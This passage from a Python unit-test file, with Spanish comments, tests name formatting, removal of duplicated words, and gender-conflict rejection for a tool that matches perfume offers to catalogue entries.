        self.assertEqual(formatear_nombre_especifico(p_eros_h), "Eros Hombre EDT")

        # Caso con género explícito en el nombre: no debe redundar
        p_pour_homme = {"nombre": "Sauvage Pour Homme", "marca": "Dior", "genero": "Hombre", "tipo": "Eau de Toilette"}
        # Aserción de prueba unitaria: self.assertEqual(formatear_nombre_especifico(p_pour_...
        self.assertEqual(formatear_nombre_especifico(p_pour_homme), "Sauvage Pour Homme EDT")

        # Caso corto sin género explícito: debe incluir género
        p_sauvage = {"nombre": "Sauvage Elixir", "marca": "Dior", "genero": "Hombre", "tipo": "Elixir"}
        # Aserción de prueba unitaria: self.assertEqual(formatear_nombre_especifico(p_sauva...
        self.assertEqual(formatear_nombre_especifico(p_sauvage), "Sauvage Elixir Hombre")

    # Definición de función 'test_eliminar_palabras_duplicadas' sin parámetros externos
    def test_eliminar_palabras_duplicadas(self):
        # Caso duplicado técnico por scrapers
        self.assertEqual(
            eliminar_palabras_duplicadas("Good Girl Jasmine Absolute Absolute"),
            "Good Girl Jasmine Absolute"
        )
        # Aserción de prueba unitaria: self.assertEqual(eliminar_palabras_duplicadas('Oud C...
        self.assertEqual(
            eliminar_palabras_duplicadas("Oud Candy Extrait Extrait De"),
            "Oud Candy Extrait De"
        )
        # Nombres comerciales legítimos con repetición deben preservarse
        self.assertEqual(eliminar_palabras_duplicadas("Anais Anais"), "Anais Anais")
        # Aserción de prueba unitaria: self.assertEqual(eliminar_palabras_duplicadas('Amor ...
        self.assertEqual(eliminar_palabras_duplicadas("Amor Amor"), "Amor Amor")
        # Aserción de prueba unitaria: self.assertEqual(eliminar_palabras_duplicadas('Can C...
        self.assertEqual(eliminar_palabras_duplicadas("Can Can"), "Can Can")
        # Aserción de prueba unitaria: self.assertEqual(eliminar_palabras_duplicadas('Plus ...
        self.assertEqual(eliminar_palabras_duplicadas("Plus Plus"), "Plus Plus")

    # Definición de función 'test_coincide_entidad_rechazo_genero_cruzado' sin parámetros externos
    def test_coincide_entidad_rechazo_genero_cruzado(self):
        # Oferta masculina intentando asociarse a perfume femenino
        r_fem = coincide_entidad_detallada(
            titulo="Versace Eros Pour Homme EDT 200 ml",
            perfume_nombre="Eros",
            marca="Versace",
            concentracion="Eau de Parfum",
            volumen_esperado=200,
            genero_esperado="Mujer"
        )
        # Aserción de prueba unitaria: self.assertFalse(r_fem.coincide)
        self.assertFalse(r_fem.coincide)
        # Aserción de prueba unitaria: self.assertIn('Conflicto de género', r_fem.motivo)
        self.assertIn("Conflicto de género", r_fem.motivo)

        # Oferta femenina intentando asociarse a perfume masculino
        r_masc = coincide_entidad_detallada(
            titulo="Perfume Mujer Romance EDP 100ml Polo Ralph Lauren",
            perfume_nombre="Romance",
            marca="Ralph Lauren",
            concentracion="Eau de Toilette",
            volumen_esperado=100,
            genero_esperado="Hombre"
        )
        # Aserción de prueba unitaria: self.assertFalse(r_masc.coincide)
        self.assertFalse(r_masc.coincide)
        # Aserción de prueba unitaria: self.assertIn('Conflicto de género', r_masc.motivo)
        self.assertIn("Conflicto de género", r_masc.motivo)


# Punto de entrada principal cuando el script se invoca directamente desde consola
if __name__ == "__main__":
    # Ejecutamos instrucción: unittest.main()
    unittest.main()
